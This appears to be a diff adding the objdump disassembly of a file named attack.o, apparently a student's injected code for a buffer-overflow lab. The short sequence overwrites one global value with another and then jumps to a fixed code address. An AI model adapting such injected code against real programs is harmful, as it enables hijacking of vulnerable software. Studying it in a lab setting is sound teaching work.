@@ -1,0 +1,13 @@
+
+attack.o：     文件格式 elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	48 8b 14 25 d4 a1 04 	mov    0x804a1d4,%rdx
+   7:	08 
+   8:	48 89 14 25 c4 a1 04 	mov    %rdx,0x804a1c4
+   f:	08 
+  10:	48 c7 c2 10 8e 04 08 	mov    $0x8048e10,%rdx
+  17:	ff e2                	jmpq   *%rdx
